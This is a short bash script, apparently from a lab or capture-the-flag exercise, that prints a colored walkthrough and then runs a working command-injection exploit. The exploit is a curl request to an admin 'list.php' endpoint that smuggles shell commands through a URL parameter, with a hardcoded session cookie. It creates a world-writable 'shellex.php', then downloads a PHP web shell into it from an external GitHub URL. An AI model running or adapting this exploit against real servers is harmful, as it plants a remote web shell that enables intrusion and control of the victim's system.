RED="\e[1;91m"
GREEN="\e[92m"
CYAN="\e[1;96m"
YELLOW="\e[1;93m"
MAGENTA="\e[95m"
GREY="\e[90m"
ENDCOLOUR="\e[0m"

echo
echo -e "${RED}((  m a d e    b y${ENDCOLOUR}    ${YELLOW}j o e${ENDCOLOUR}  ${RED}))${ENDCOLOUR}"
echo -e "${MAGENTA}Hey, here's the exploit ;)${ENDCOLOUR}"
echo
echo
echo -e "${GREEN}Commands are executed in /var/www/html/admin${ENDCOLOUR}"
echo
echo -e "${GREEN}Injecting the following to run as web server:${ENDCOLOUR}"
echo
echo
echo -e "1.	${CYAN}touch shellex.php${ENDCOLOUR} "
echo -e "     ${GREY}Create the new empty \"shellex.php\" file.${ENDCOLOUR}"
echo
echo -e "2.	${CYAN}chmod 777 shellex.php${ENDCOLOUR}" 
echo -e "     ${GREY}Give everyone full access to \"shellex.php\"${ENDCOLOUR}"
echo
echo -e "3.	${CYAN}curl https://raw.githubusercontent.com/kpafg/SaNEx4Exploit/main/shellex.php > shellex.php${ENDCOLOUR}" 
echo -e "     ${GREY}Copy code from my github into \"shellex.php\"${ENDCOLOUR}"
echo
echo
echo
echo -e "${GREEN}This is all done with the command:${GREEN}"
echo -e "${CYAN}curl 'http://192.168.103.3/admin/list.php?path=%3Btouch%20shellex.php%3Bchmod%20%2Brwx%20shellex.php%3Bcurl%20https%3A%2F%2Fraw.githubusercontent.com%2Fkpafg%2FSaNEx4Exploit%2Fmain%2Fshellex.php%20%3E%20shellex.php' -H 'Cookie: PHPSESSID=5eo5g0sncig70esljb71cebcop; 040ec1ee950ffc53291f6df0ffc30325=c4ca4238a0b923820dcc509a6f75849b' > /dev/null 2>&1${ENDCOLOUR}"

curl 'http://192.168.103.3/admin/list.php?path=%3Btouch%20shellex.php%3Bchmod%20%2Brwx%20shellex.php%3Bcurl%20https%3A%2F%2Fraw.githubusercontent.com%2Fkpafg%2FSaNEx4Exploit%2Fmain%2Fshellex.php%20%3E%20shellex.php' -H 'Cookie: PHPSESSID=5eo5g0sncig70esljb71cebcop; 040ec1ee950ffc53291f6df0ffc30325=c4ca4238a0b923820dcc509a6f75849b' > /dev/null 2>&1
